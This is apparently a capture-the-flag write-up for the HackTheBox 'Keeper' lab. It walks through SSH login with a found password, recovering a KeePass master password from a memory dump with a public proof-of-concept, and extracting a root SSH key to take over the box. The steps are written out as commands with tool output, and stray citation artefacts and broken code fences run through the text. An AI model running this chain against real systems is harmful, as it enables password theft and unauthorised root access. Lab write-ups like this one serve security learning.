### User Shell (lnorgaard)

`sshpass -p 'Welcome2023!' ssh lnorgaard@keeper.htb`

- Grab `user.txt`.
    
- Spot a **RT30000.zip** archive in the home folder that contains
    
    - `KeePassDumpFull.dmp` (≈242 MB)
        
    - `passcodes.kdbx` (KeePass DB)

### Privilege Escalation – KeePass memory dump (CVE-2022-32784)

1. **Download the dump** (`scp` ( for download via ssh ) or python -m http.server).
    
2. **Run the original PoC** (Dotnet) inside a 7.0 SDK container to avoid local install:
    

` "git clone https://github.com/vdohney/keepass-password-dumper && \              cd keepass-password-dumper && dotnet run /data/KeePassDumpFull.dmp"`

The tool recovers every character _except_ the first, and gives choices for the 2nd:

``Unknown characters are displayed as "●" 1.: ● 2.: ø, Ï, l, `, … M 3.: d   4.: g   5.: r   6.: ø   7.: d   8.: <space> 9.: m  10.: e  11.: d  12.: <space> 13.: f 14.: l 15.: ø 16.: d 17.: e Combined: ●{ø,…,M}dgrød med fløde ``` :contentReference[oaicite:5]{index=5}  3. **Human logic** – Danish user → famous tongue-twister dessert →      **“Rødgrød med fløde”** → prepend the missing **“Rø”**. :contentReference[oaicite:6]{index=6}    ---  ### 5  Looting `passcodes.kdbx`  ```bash kpcli --kdb passcodes.kdbx      # enter master pwd: Rødgrød med fløde kpcli:/passcodes/Network> ls    # two entries kpcli:/passcodes/Network> show -f 0``

- Entry 0 contains a **PuTTY-format root SSH key** (`.ppk`) in the Notes field;  
    entry 1 just repeats lnorgaard’s creds.
    

---

### Root Shell

1. **Copy the PPK** into `root.ppk` (remove leading spaces).
    
2. Convert to OpenSSH:
    

`puttygen root.ppk -O private-openssh -o id_root_ssh`

3. **SSH as root**
    

`ssh -i id_root_ssh root@keeper.htb`

_Read `root.txt` – box finished_